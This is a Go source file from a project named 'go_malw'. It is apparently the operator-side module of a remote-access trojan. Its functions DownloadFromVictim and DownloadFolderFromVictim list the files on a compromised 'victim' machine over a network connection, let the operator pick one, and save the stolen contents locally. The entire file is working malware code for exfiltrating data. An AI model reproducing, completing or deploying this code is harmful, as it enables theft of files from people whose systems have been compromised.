package Download

import (
	"bufio"
	"encoding/gob"
	"fmt"
	"go_malw/server/core/color"
	"net"
	"os"
	"strconv"
	"strings"
)

type FilesList struct {
	Files []string
}

type Data struct {
	FileName    string
	FileSize    int
	FileContent []byte
}

func DownloadFromVictim(connection net.Conn) (err error) {

	filesStruct := &FilesList{}

	decoder := gob.NewDecoder(connection)

	err = decoder.Decode(filesStruct)

	fmt.Println("\n\t----------------------------------------------------")
	fmt.Println(color.Cyan + "\tINDEX\t" + color.Reset + " FILE NAME")
	fmt.Println("\t----------------------------------------------------")
	for index, fileName := range filesStruct.Files {
		fmt.Println(color.Cyan+"\t", index, "\t", color.Reset+fileName)
	}

	fmt.Println(color.Cyan+"\t", "stop", "\t", color.Reset+"Go to menu")
	fmt.Println("\t----------------------------------------------------")
	fmt.Println()

	//QUI SCELGO IL FILE!!!
	fmt.Print(color.Blue + "[*]" + color.Reset + " Select the" + color.Cyan + " INDEX: " + color.Reset)
	reader := bufio.NewReader(os.Stdin)

	file2DownloadIndex_raw, err := reader.ReadString('\n')
	println(file2DownloadIndex_raw)

	if file2DownloadIndex_raw == "stop\n" {
		nbyte, err := connection.Write([]byte("stop\n"))
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
		}
		fmt.Println(color.Green+"[+]"+color.Reset+" Going to menu... ", nbyte)

	} else if file2DownloadIndex_raw != "stop\n" {

		file2DownloadIndex := strings.TrimSuffix(file2DownloadIndex_raw, "\n")

		file_index, _ := strconv.Atoi(file2DownloadIndex)

		FileName := filesStruct.Files[file_index]

		nbyte, err := connection.Write([]byte(FileName + "\n"))
		if err != nil {
			fmt.Println(color.Red + "[-]" + color.Reset + err.Error())
		}
		fmt.Println(color.Green+"[+]"+color.Reset+" File name sent: ", nbyte)

		//decoder := gob.NewDecoder(connection)

		fs := &Data{}
		err = decoder.Decode(fs)

		file, err := os.Create(fs.FileName)
		nbytes, err := file.Write(fs.FileContent)
		fmt.Println(color.Green+"[+]"+color.Reset+" File downloaded successfully, ", nbytes)
		//} else {
		//	fmt.Println(color.Green + "[+]" + color.Reset + " No file sent")
	}
	return
}

func DownloadFolderFromVictim(connection net.Conn) (err error) {
	filesStruct := &FilesList{}

	decoder := gob.NewDecoder(connection)

	err = decoder.Decode(filesStruct)
	for index, folderName := range filesStruct.Files {
		fmt.Println("\t", index, "\t", folderName)
	}

	fmt.Print("[+] Select folder: ")
	reader := bufio.NewReader(os.Stdin)

	folder2DownloadIndex_raw, err := reader.ReadString('\n')
	folder2DownloadIndex := strings.TrimSuffix(folder2DownloadIndex_raw, "\n")

	folder_index, _ := strconv.Atoi(folder2DownloadIndex)

	FolderName := filesStruct.Files[folder_index]

	nbyte, err := connection.Write([]byte(FolderName + "\n"))
	fmt.Println("[+] Folder name sent: ", nbyte)

	return
}
